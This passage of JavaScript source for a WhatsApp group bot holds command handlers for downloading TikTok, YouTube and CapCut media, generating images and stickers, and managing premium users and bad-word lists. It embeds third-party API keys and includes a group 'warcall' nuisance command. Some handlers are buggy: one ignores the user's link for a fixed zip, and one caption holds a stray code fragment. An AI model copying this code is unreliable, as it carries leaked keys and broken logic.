if (!m.isGroup) return reply('Group special features!')
if (!DanzTheCreator && !isAdmins) return reply('Special owner features!')
if (!text) return reply(`Use in a way ${prefix + command} *text_left*\n\n_Sample_\n\n${prefix + command} Hello @user, goodbye from @group`)
if (isSetLeft(m.chat, set_left_db)) {
addCountCmd('#changeleft', m.sender, _cmd)
changeSetLeft(q, m.chat, set_left_db)
reply(`Successfully change set left text!`)
} else {
addCountCmd('#changeleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
reply(`Successfully change set left text!`)
}
break
case 'delsetleft':
if (!m.isGroup) return reply('Group special features!')
if (!DanzTheCreator && !isAdmins) return reply('Special owner features!')
if (!isSetLeft(m.chat, set_left_db)) return reply(`There is no set left here..`)
addCountCmd('#delsetleft', m.sender, _cmd)
removeSetLeft(m.chat, set_left_db)
reply(`Successfully delete set left`)
break
//=========================================\\======

//=========================================\\======

//=========================================\\======

//=========================================\\======

//==================================================================

case 'tiktoksearch':
case 'carivideotiktok':
case 'ttsearch': {
  if (!text) return reply('_What do you want to find_');
  NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
  try {
    const data = await fetchJson(`https://skizoasia.xyz/api/tiktok-search?apikey=nonogembul&keywords=${encodeURIComponent(text)}`);
    const video = data[0]; // Assuming the first video in the search results is used
    if (!video) return reply('_No video found_');
    const caption = `_⚡"Tiktok Search By ${botname}_\n\n*Title:* ${video.title}\n*Region:* ${video.region}\n*Durasi:* ${video.duration} detik\n*Dibuat oleh:* ${video.music_info.author}\n*Jumlah Like:* ${video.digg_count}\n*Jumlah Komentar:* ${video.comment_count}\n*Jumlah Share:* ${video.share_count}\n*Jumlah Tonton:* ${video.play_count}`;

    const videoMessage = {
      video: { url: video.play },
      caption: caption,
      jpegThumbnail: await getBuffer(video.cover), // Assuming getBuffer is a function to fetch image buffer
      contextInfo: {
        externalAdReply: {
          title: video.title,
          body: `By ${video.music_info.author}`,
          mediaType: 2,
          thumbnail: await getBuffer(video.cover),
          mediaUrl: video.play,
          sourceUrl: video.play
        }
      }
    };

    await NanoBotz.sendMessage(m.chat, videoMessage, { quoted: m });
  } catch (error) {
    console.error(error);
    reply('_Maaf, terjadi kesalahan dalam melakukan pencarian TikTok_');
  }
}
break;
//==================================================================

//==================================================================
case 'text2image':
case 'text2img': {
if (!text) return reply('mana promt nya Kak')
reply(mess.wait)
	try {
NanoBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}__`}, { quoted: m})
	} catch {
	  reply('well error Bro report to the owner to be fixed')
	}
}
break
//=============================================================

//==================================================================
case 'hdvid' :
case 'hd' : {
  reply('_Process.... it might take a long time, please wait for about 4-8 minutes')
  NanoHDvideo()
}
break
//==================================================================
case 'terabox':
case 'teraboxdl': {
  if(!text) return reply('which link')
reply(mess.wait)
  const response = await fetch(`https://api.alyachan.dev/api/terabox?url=${encodeURIComponent(text)}&apikey=nanogembul`);
const data = await response.json();
const downloadLink = data.data.url;
const caption = data.data.filename;
const responseHeaders = response.headers;
const mimeType = responseHeaders.get('content-type');
NanoBotz.sendMessage(m.chat, { document: { url: downloadLink, mimetype: mimeType }, fileName: caption }, { quoted: m });

}
break
//==================================================================
case 'capcutdl':case 'cc': case 'capcut': {
const axios = require('axios')
function download(url) {
  return new Promise(async(resolve, reject) => {
    try {
      let cc = await axios.get(url, {
        headers: {
          'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
        }
      }).then(x => x.data)
      
      let dataMatch = /<script nonce="argus-csp-token">window\._ROUTER_DATA = (.*?)<\/script>/;
      if (cc.match(dataMatch)) {
        let getJson = JSON.parse(cc.match(dataMatch)[1]).loaderData['template-detail_$'].templateDetail
        if (getJson.templateId) {
          resolve({ status: true, mess: `Successfully retrieve data`, data: getJson })
        } else {
          resolve({ status: false, mess: `No metadata available`})
        }
      }
    } catch(e) {
      reject({ status: false, mess: `Failed to take metadata`})
    }
  })
}
if (!text.includes('www.capcut.net')) return m.reply('Enter the cc link!!')
let hasil = await download(text)
try {
let deku = `⏤͟͟͞͞╳── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴄᴄ ]* ── .々─ᯤ\n`
deku += `│    =〆 ᴛɪᴛʟᴇ: ${hasil.data.title}\n`
deku += `│    =〆 ᴅᴇsᴄ: ${hasil.data.desc}\n`
deku += `│    =〆 ɪᴅ: ${hasil.data.templateId}\n`
deku += `│    =〆 ᴜʀʟ: ${hasil.data.structuredData.url}\n`
deku += `⏤͟͟͞͞╳────────── .✦`
await NanoBotz.sendMessage(m.chat, { video: { url: hasil.data.videoUrl }, caption: deku }, { quoted: m })
} catch (e) {
 m.reply('error...')
}

}
break
case 'brat': {
const { createCanvas, registerFont } = require('canvas');
const Jimp = require('jimp');
async function BratGenerator(teks) {
  let width = 512;
  let height = 512;
  let margin = 20;
  let wordSpacing = 50; 
  let canvas = createCanvas(width, height);
  let ctx = canvas.getContext('2d');
  ctx.fillStyle = 'white';
  ctx.fillRect(0, 0, width, height);
  let fontSize = 280;
  let lineHeightMultiplier = 1.3;
  ctx.textAlign = 'left';
  ctx.textBaseline = 'top';
  ctx.fillStyle = 'black';
registerFont('./lib/arialnarrow.ttf', { family: 'Narrow' });
  let words = teks.split(' ');
  let lines = [];
  let rebuildLines = () => {
    lines = [];
    let currentLine = '';
    for (let word of words) {
      let testLine = currentLine ? `${currentLine} ${word}` : word;
      let lineWidth =
        ctx.measureText(testLine).width + (currentLine.split(' ').length - 1) * wordSpacing;
      if (lineWidth < width - 2 * margin) {
        currentLine = testLine;
      } else {
        lines.push(currentLine);
        currentLine = word;
      }
    }
    if (currentLine) {
      lines.push(currentLine);
    }
  };
  ctx.font = `${fontSize}px Narrow`;
  rebuildLines();
  while (lines.length * fontSize * lineHeightMultiplier > height - 2 * margin) {
    fontSize -= 2;
    ctx.font = `${fontSize}px Narrow`;
    rebuildLines();
  }
    let lineHeight = fontSize * lineHeightMultiplier;
  let y = margin;
  for (let line of lines) {
    let wordsInLine = line.split(' ');
    let x = margin;
    for (let word of wordsInLine) {
      ctx.fillText(word, x, y);
      x += ctx.measureText(word).width + wordSpacing;
    }
    y += lineHeight;
  }
  let buffer = canvas.toBuffer('image/png');
  let image = await Jimp.read(buffer);
  image.blur(3);
  let blurredBuffer = await image.getBufferAsync(Jimp.MIME_PNG);
return NanoBotz.sendImageAsSticker(m.chat, blurredBuffer, m, { packname: "PATRON-MD", author: "PATRON!!" })
}
if (!text) return m.reply(`Enter the text for stickers.\n\nSample:\n.BRAT ADMIN HANDS`);
return BratGenerator(text)
}
break
//==================================================================

//==================================================================
//=========================================\\
case 'tenor': {
function isValidURL(message) {
    const urlPattern = /https?:\/\/[^\s/$.?#].[^\s]*/;
    return urlPattern.test(message);
}

async function getTemplateImageUrl(input, number) {
    try {
        const data = await (await fetch(`https://g.tenor.com/v1/search?q=${input}&key=LIVDSRZULELA`)).json();
        const selectedId = data.results[number - 1];
        return {
            one: selectedId,
            all: data.results
        };
    } catch (error) {
        console.error("Error fetching data:", error);
        return "Error fetching data.";
    }
}
    let [tema, urutan] = text.split(/[^\w\s]/g)
    if (!tema) return m.reply("*Example:*\n.tenor [tema]|[angka]")
    if (!urutan) return m.reply("*Example:*\n.tenor [tema]|[angka]")
    if (isNaN(urutan)) return m.reply("*Example:*\n.tenor [tema]|[angka]")
    await m.reply(mess.wait)
    try {
        let json = await getTemplateImageUrl(tema, urutan)
        let data = json.one
        let all = json.all
        if (urutan > all.length) return m.reply("Input query!\n*Example:*\n.tenor [tema]|[angka]\n\n*Pilih angka yg ada*\n" + all.map((item, index) => `*${index + 1}.* ${item.content_description}`).join("\n"))
        if (isValidURL(data.media[0].mp4.url)) {
            let caption = `🔍 *[ RESULTS ]*

🆔 *ID:* ${data.id}
🌐 *URL:* ${data.url}
📋 *Description:* ${data.content_description}
📌 *Item:* ${data.itemurl}`
            await NanoBotz.sendMessage(m.chat, {
                video: {
                    url: data.media[0].mp4.url
                },
                caption: caption,
                gifPlayback: true,
                gifAttribution: 2
            }, {
                quoted: m
            })
        }
    } catch (e) {
        await m.reply(eror)
    }
}
break

//===============Store-Menu================\\


//=========================================\\	
case 'gptimg':
case 'bingimg': {
if (!isPrem) return replyprem(mess.premium)
if (!text) return reply('Naya Boss Man...')
await NanoBotz.sendMessage(m.chat, { react: { text: "🚹",key: m.key,}}) 
    try {
 NanoBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Success in making ${command} With a prompt:\n${text}_`}, { quoted: m})
    } catch (error) {
reply('eror')
    }
}
break
//=========================================\\	
case 'smeta': {
if (!/webp/.test(mime)) return replynano('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await NanoBotz.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replynano('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `Patron-md`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) NanoBotz.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replynano('reply sticker')
                                                                              }
                                                                              }       
                                                                              break
			case 'gimage': {
if (!text) return replynano(`Example : ${prefix + command} carry minati`)
reply(mess.wait)
await NanoBotz.sendMessage(m.chat, { react: { text: "🚹",key: m.key,}}) 
    try {
 NanoBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
    } catch (error) {
reply('eror')
    }
}
        break
			case 'mediafire': {
	if (args.length == 0) return replynano(`Where is the link?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replynano(`The link you provided is invalid`)
	const text = 'https://www.mediafire.com/file/xdw0j1tugxknsdi/Aspira-Bot-V2.8-Free.zip'
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	console.log(baby1)
	if (baby1[0].size.split('MB')[0] >= 10000) return replynano('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
replynano(`${result4}`)
NanoBotz.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'tiktokxx':{ 
if (!text) return replynano( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replynano(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
NanoBotz.sendMessage(m.chat, { caption: `Here he is!!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokaudioxx':{
if (!text) return replynano( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replynano(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
NanoBotz.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'google': {
if (!q) return replynano(`Example : ${prefix + command} ${botname}`)
reply(mess.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replynano(teks)
})
}
break
case 'happymod':{
if (!q) return replynano(`Example ${prefix+command} Sufway surfer mod`)
NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let kat = await scp1.happymod(q)
replynano(util.format(kat))
}
break
case 'yts': case 'ytsearch': {
if (!text) return replynano(`Example : ${prefix + command} story wa anime`);
const yts = require('yt-search');
async function searchYouTube(text) {
    let search = await yts(text);
    let teks = `🔎 YouTube Search\n\nSearch results from: ${text}\n\n`;
    let no = 1;
    let hasilPencarian = search.all.map(v => `${no++}. ${v.title}\n[Link]: ${v.url}`).join('\n\n');
    teks += hasilPencarian;
    await NanoBotz.sendMessage(m.chat, { text: teks }, { quoted: m });
}
searchYouTube(text);
          }
            break
case 'yts2': case 'ytsearch2': {
if (!text) return replynano(`Example : ${prefix + command} story wa anime`)
const yts = require('yt-search');
async function searchYouTube(text) {
    let search = await yts(text);
    let teks = `🔎 YouTube Search\n\nSearch results from: ${text}\n\n`;
    let no = 1;
    let caption = search.all.map((v, i) => {
        return {
            header: "",
            title: v.title,
            description: `[ ytmp4 ] Link: ${v.url}`,
            id: '.ytmp4 ' + v.url
        };
    });

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: {
                        text: `🔎 Search results from ${text}\nPlease select the list below`
                    },
                    footer: {
                        text: botname
                    },
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: search.all[0].thumbnail } }, { upload: NanoBotz.waUploadToServer })),
          title: '',
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "CLICK HERE",
                                    sections: [
                                        {
                                            title: "",
                                            rows: caption
                                        }
                                    ]
                                })
                            }
                        ]
                    }
                }
            }
        }
    }, { quoted: m }, {});
    await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
searchYouTube(text)
          }
            break
case 'warcall': {
 if (!m.isGroup) return reply(mess.only.group)
if(!text) return reply(`sample: \n.warcall kontol`)
NanoBotz.relayMessage(m.chat, {
scheduledCallCreationMessage: {
callType: 2,
scheduledTimestampMs:  Date.now(),
title: text
}
}, {})
}
break
case 'xxxxplay':{
if (!text) return replynano(`Example : ${prefix+command} story wa anime`)
reply(mess.wait)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = `${ownernumber}@s.whatsapp.net`
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Link : ${anu.url}

Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`
NanoBotz.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
}
break
case 'play': case 'song': case'music': {
const yts = require('yt-search');
const randomAudioQuality = () => {
    const qualities = [1, 2, 3, 4]; // Indeks kualitas
    const randomIndex = Math.floor(Math.random() * qualities.length);
    return qualities[randomIndex];
};
const checkQuality = (type, qualityIndex) => {
    const qualities = {
        audio: { 1: '32', 2: '64', 3: '128', 4: '192' },
        video: { 1: '144', 2: '240', 3: '360', 4: '480', 5: '720', 6: '1080', 7: '1440', 8: '2160' }
    };
    if (!qualities[type]?.[qualityIndex]) {
        throw new Error(`❌ Quality ${type} invalid. Select one: ${Object.keys(qualities[type]).join(', ')}`);
    }
};
const fetchData = async (url, cdn, body = {}) => {
    const headers = {
        accept: '*/*',
        referer: 'https://ytshorts.savetube.me/',
        origin: 'https://ytshorts.savetube.me/',
        'user-agent': 'Postify/1.0.0',
        'Content-Type': 'application/json',
        authority: `cdn${cdn}.savetube.su`
    };
    try {
        const response = await axios.post(url, body, { headers });
        return response.data;
    } catch (error) {
        console.error(`Error accessing CDN${cdn}: ${error.message}`);
        throw new Error('❌ Failed to retrieve data from the server.');
    }
};
const randomCdn = () => {
    const availableCdns = [51, 52, 53, 54, 56, 57, 58, 59, 60, 61];
    return availableCdns[Math.floor(Math.random() * availableCdns.length)];
};
const dLink = (cdnUrl, type, quality, videoKey) => {
    return `https://${cdnUrl}/download`;
};
const dl = async (link, qualityIndex, typeIndex) => {
    const type = typeIndex === 1 ? 'audio' : 'video';
    const qualities = { 1: '32', 2: '64', 3: '128', 4: '192' };
    const quality = qualities[qualityIndex];

    if (!type) throw new Error('❌ Invalid type. Select 1 for audio or 2 for video.');
    checkQuality(type, qualityIndex);

    const cdnNumber = randomCdn();
    const cdnUrl = `cdn${cdnNumber}.savetube.su`;

    const videoInfo = await fetchData(`https://${cdnUrl}/info`, cdnNumber, { url: link });
    const body = {
        downloadType: type,
        quality: quality,
        key: videoInfo.data.key
    };
    const dlRes = await fetchData(dLink(cdnUrl, type, quality, videoInfo.data.key), cdnNumber, body);

    return {
        link: dlRes.data.downloadUrl,
        duration: videoInfo.data.duration,
        durationLabel: videoInfo.data.durationLabel,
        fromCache: videoInfo.data.fromCache,
        id: videoInfo.data.id,
        key: videoInfo.data.key,
        thumbnail: videoInfo.data.thumbnail,
        thumbnail_formats: videoInfo.data.thumbnail_formats,
        title: videoInfo.data.title,
        titleSlug: videoInfo.data.titleSlug,
        videoUrl: videoInfo.data.url,
        quality,
        type
    };
};
if (!text) return reply("Send commands with the title song or YouTube link!");
try {
  NanoBotz.sendMessage(m.chat, { react: { text: "🚹",key: m.key,}})
    let rus = await yts(text);
    if (rus.all.length === 0) return reply("VIdeo is not found or cannot be downloaded.");
    let data = rus.all.filter(v => v.type === 'video');
    if (data.length === 0) return reply("No video was found.");
    let res = data[0];
    let thumbUrl = `https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`;
    let inithumb = await getBuffer(thumbUrl);
    let teks = `*🎶 Y O U T U B E  -  P L A Y 🎶*\n\n` +
               `📺 *Channel* : ${res.author.name}\n` +
               `👀 *Viewers* : ${res.views} Views\n` +
               `⏱️ *Duration* : ${res.timestamp}\n` +
               `🔗 *Link Video* : ${res.url}\n\n` +
               `🎧 *Audio is being processed...* 🎶`;

    await NanoBotz.sendMessage(m.chat, {
        contextInfo: { 
            externalAdReply: { 
                showAdAttribution: true, 
                title: res.title,
                body: new Date().toLocaleString(),													
                mediaType: 2,  
                renderLargerThumbnail: true,
                thumbnail: inithumb,
                mediaUrl: res.url,
                sourceUrl: res.url
            }
        },
        image: { url: thumbUrl },
        text: teks
    }, { quoted: m });

    const isUrl = /^https?:\/\/(www\.)?youtube\.com\/watch\?v=/.test(q);
    let videoUrl = text;
    if (!isUrl) {
        let searchResults = await yts(text);
        if (!searchResults.all.length) return reply("No video found!");
        let videoData = searchResults.all.find(v => v.type === 'video');
        if (!videoData) return reply("No video suitable to find!");
        videoUrl = videoData.url;
    }

    const qualityIndex = randomAudioQuality();
    const audioData = await dl(videoUrl, qualityIndex, 1); 
    await NanoBotz.sendMessage(m.chat, { 
        audio: { url: audioData.link }, 
        mimetype: 'audio/mp4' 
    }, { quoted: m });

} catch (err) {
    console.error(err);
    reply(`There is an error: ${err.message}`);
}

}
break
case 'ytmp3': { 
const yts = require('yt-search');
const randomAudioQuality = () => {
    const qualities = [1, 2, 3, 4]; // Indeks kualitas
    const randomIndex = Math.floor(Math.random() * qualities.length);
    return qualities[randomIndex];
};
const checkQuality = (type, qualityIndex) => {
    const qualities = {
        audio: { 1: '32', 2: '64', 3: '128', 4: '192' },
        video: { 1: '144', 2: '240', 3: '360', 4: '480', 5: '720', 6: '1080', 7: '1440', 8: '2160' }
    };
    if (!qualities[type]?.[qualityIndex]) {
        throw new Error(`❌ Quality ${type} invalid. Select one: ${Object.keys(qualities[type]).join(', ')}`);
    }
};
const fetchData = async (url, cdn, body = {}) => {
    const headers = {
        accept: '*/*',
        referer: 'https://ytshorts.savetube.me/',
        origin: 'https://ytshorts.savetube.me/',
        'user-agent': 'Postify/1.0.0',
        'Content-Type': 'application/json',
        authority: `cdn${cdn}.savetube.su`
    };
    try {
        const response = await axios.post(url, body, { headers });
        return response.data;
    } catch (error) {
        console.error(`Error accessing CDN${cdn}: ${error.message}`);
        throw new Error('❌ Failed to retrieve data from the server.');
    }
};
const randomCdn = () => {
    const availableCdns = [51, 52, 53, 54, 56, 57, 58, 59, 60, 61];
    return availableCdns[Math.floor(Math.random() * availableCdns.length)];
};
const dLink = (cdnUrl, type, quality, videoKey) => {
    return `https://${cdnUrl}/download`;
};
const dl = async (link, qualityIndex, typeIndex) => {
    const type = typeIndex === 1 ? 'audio' : 'video';
    const qualities = { 1: '32', 2: '64', 3: '128', 4: '192' };
    const quality = qualities[qualityIndex];

    if (!type) throw new Error('❌ Invalid type. Select 1 for audio or 2 for video.');
    checkQuality(type, qualityIndex);

    const cdnNumber = randomCdn();
    const cdnUrl = `cdn${cdnNumber}.savetube.su`;

    const videoInfo = await fetchData(`https://${cdnUrl}/info`, cdnNumber, { url: link });
    const body = {
        downloadType: type,
        quality: quality,
        key: videoInfo.data.key
    };
    const dlRes = await fetchData(dLink(cdnUrl, type, quality, videoInfo.data.key), cdnNumber, body);

    return {
        link: dlRes.data.downloadUrl,
        duration: videoInfo.data.duration,
        durationLabel: videoInfo.data.durationLabel,
        fromCache: videoInfo.data.fromCache,
        id: videoInfo.data.id,
        key: videoInfo.data.key,
        thumbnail: videoInfo.data.thumbnail,
        thumbnail_formats: videoInfo.data.thumbnail_formats,
        title: videoInfo.data.title,
        titleSlug: videoInfo.data.titleSlug,
        videoUrl: videoInfo.data.url,
        quality,
        type
    };
};
if (!text) return reply("Send the command with the YouTube link!");
try {
NanoBotz.sendMessage(m.chat, { react: { text: "🚹",key: m.key,}})
    let rus = await yts(text);
    if (rus.all.length === 0) return reply("No video found or cannot be downloaded.");
    let data = rus.all.filter(v => v.type === 'video');
    if (data.length === 0) return reply("No video was found.");
    let res = data[0];
    let thumbUrl = `https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`;
    let inithumb = await getBuffer(thumbUrl);
    let teks = `*🎶 Y O U T U B E  -  P L A Y 🎶*\n\n` +
               `📺 *Channel* : ${res.author.name}\n` +
               `👀 *Viewers* : ${res.views} Views\n` +
               `⏱️ *Duration* : ${res.timestamp}\n` +
               `🔗 *Link Video* : ${res.url}\n\n` +
               `🎧 *const jimp_1 = require('jimp')...* 🎶`;

    await NanoBotz.sendMessage(m.chat, {
        contextInfo: { 
            externalAdReply: { 
                showAdAttribution: true, 
                title: res.title,
                body: new Date().toLocaleString(),													
                mediaType: 2,  
                renderLargerThumbnail: true,
                thumbnail: inithumb,
                mediaUrl: res.url,
                sourceUrl: res.url
            }
        },
        image: { url: thumbUrl },
        text: teks
    }, { quoted: m });

    const isUrl = /^https?:\/\/(www\.)?youtube\.com\/watch\?v=/.test(q);
    let videoUrl = text;
    if (!isUrl) {
        let searchResults = await yts(text);
        if (!searchResults.all.length) return reply("No video found!");
        let videoData = searchResults.all.find(v => v.type === 'video');
        if (!videoData) return reply("No video suitable to find!");
        videoUrl = videoData.url;
    }

    const qualityIndex = randomAudioQuality();
    const audioData = await dl(videoUrl, qualityIndex, 1); 
    await NanoBotz.sendMessage(m.chat, { 
        audio: { url: audioData.link }, 
        mimetype: 'audio/mp4' 
    }, { quoted: m });

} catch (err) {
    console.error(err);
    reply(`There is an error: ${err.message}`);
}
}
break;
case 'ytvideo':
case 'ytmp4': {
  const axios = require('axios');
const SaveTube = {
    qualities: {
        audio: { 1: '32', 2: '64', 3: '128', 4: '192' },
        video: { 1: '144', 2: '240', 3: '360', 4: '480', 5: '720', 6: '1080', 7: '1440', 8: '2160' }
    },
    
    headers: {
        'accept': '*/*',
        'referer': 'https://ytshorts.savetube.me/',
        'origin': 'https://ytshorts.savetube.me/',
        'user-agent': 'Postify/1.0.0',
        'Content-Type': 'application/json'
    },

    cdn() {
        return Math.floor(Math.random() * 11) + 51;
    },

    checkQuality(type, qualityIndex) {
        if (!(qualityIndex in this.qualities[type])) {
            throw new Error(`❌ Quality ${type} invalid. Select one: ${Object.keys(this.qualities[type]).join(', ')}`);
        }
    },

    async fetchData(url, cdn, body = {}) {
        const headers = {
            ...this.headers,
            'authority': `cdn${cdn}.savetube.su`
        };

        try {
            const response = await axios.post(url, body, { headers });
            return response.data;
        } catch (error) {
            console.error(error);
            throw error;
        }
    },
    dLink(cdnUrl, type, quality, videoKey) {
        return `https://${cdnUrl}/download`;
    },
    async dl(link, qualityIndex, typeIndex) {
        const type = typeIndex === 1 ? 'audio' : 'video';
        const quality = SaveTube.qualities[type][qualityIndex];
        if (!type) throw new Error('❌ Invalid type. Select 1 for audio or 2 for video.');
        SaveTube.checkQuality(type, qualityIndex);
        const cdnNumber = SaveTube.cdn();
        const cdnUrl = `cdn${cdnNumber}.savetube.su`;
        
        const videoInfo = await SaveTube.fetchData(`https://${cdnUrl}/info`, cdnNumber, { url: link });
        const badi = {
            downloadType: type,
            quality: quality,
            key: videoInfo.data.key
        };

        const dlRes = await SaveTube.fetchData(SaveTube.dLink(cdnUrl, type, quality, videoInfo.data.key), cdnNumber, badi);

        return {
            link: dlRes.data.downloadUrl,
            duration: videoInfo.data.duration,
            durationLabel: videoInfo.data.durationLabel,
            fromCache: videoInfo.data.fromCache,
            id: videoInfo.data.id,
            key: videoInfo.data.key,
            thumbnail: videoInfo.data.thumbnail,
            thumbnail_formats: videoInfo.data.thumbnail_formats,
            title: videoInfo.data.title,
            titleSlug: videoInfo.data.titleSlug,
            videoUrl: videoInfo.data.url,
            quality,
            type
        };
    }
};
    const args = m.text.split(' ');
    const link = args[1];
    const qualityIndex = parseInt(args[2]) || 3; 
    if (command === 'ytmp4') {
        if (!link) {
            return NanoBotz.sendMessage(m.chat, { text: "❌ Youtube link was not found!" });
        }
         m.reply(mess.wait)
        try {
            const video = await SaveTube.dl(link, qualityIndex, 2); 
           
        await m.reply(`🚹 VVideo found: ${video.title}\nDuration: ${video.durationLabel}\nVideo is being processed...`)
     await NanoBotz.sendMessage(m.chat, { 
      video: { url: video.link }, 
      mimetype: 'video/mp4' 
    }, { quoted: m });
            
        } catch (err) {
            NanoBotz.sendMessage(m.chat, { text: `❌ Failed to download the video: ${err.message}` });
        }
    }
}
break
case 'ytvxxx': case 'ytmp4xxx': case 'mp4xxx':{
if (!text) return replynano('Enter the link!!!')
reply(mess.wait)
downloadMp4(text)
}
break
case 'ytaxxx': case 'ytmp3xxx': case 'mp3xxx':{
if (!text) return replynano('Enter the link!!!')
reply(mess.wait)
downloadMp3(text)
}
break  

//=========================================\\
case 'addprem': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args[0]) return replynano(`Use ${prefix+command} number\nExample ${prefix+command} 234xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await NanoBotz.onWhatsApp(prrkek)
if (ceknya.length == 0) return replynano(`Enter a valid number and registered on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replynano(`The Number ${prrkek} Has Been Premium!`)
}
break
//=========================================\\
case 'delprem':
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args[0]) return replynano(`Use ${prefix+command} number\nExample ${prefix+command} 234xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replynano(`The Number ${ya} Has Been Removed Premium!`)
break
case 'addbadword':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Whats the word?')
if (BadNano.includes(q)) return replynano("The word is already in use")
BadNano.push(q)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadNano))
replynano(`Success Adding Bad Word\nCheck by typing ${prefix}listbadword`)
}
break
case 'delbadword':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Enter the word')
if (!BadNano.includes(q)) return replynano("The word does not exist in the database")
let wanu = BadNano.indexOf(q)
BadNano.splice(wanu, 1)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadNano))
replynano(`Success deleting bad word ${q}`)
}
break
case 'listbadword':{
let teks = '┌──⭓「 *BadWord List* 」\n│\n'
for (let x of BadNano) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${BadNano.length}*`
replynano(teks)
}
break
case 'addvideo':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Whats the video name?')
if (VideoNano.includes(q)) return replynano("The name is already in use")
let delb = await NanoBotz.downloadAndSaveMediaMessage(quoted)
VideoNano.push(q)
await fsx.copy(delb, `./data/NanoMedia/video/${q}.mp4`)
fs.writeFileSync('./data/NanoMedia/database/xeonvideo.json', JSON.stringify(VideoNano))
fs.unlinkSync(delb)
replynano(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Enter the video name')
if (!VideoNano.includes(q)) return replynano("The name does not exist in the database")
let wanu = VideoNano.indexOf(q)
VideoNano.splice(wanu, 1)
fs.writeFileSync('./data/NanoMedia/database/xeonvideo.json', JSON.stringify(VideoNano))
fs.unlinkSync(`./data/NanoMedia/video/${q}.mp4`)
replynano(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoNano) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoNano.length}*`
replynano(teks)
}
break
case 'addimage':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Whats the image name?')
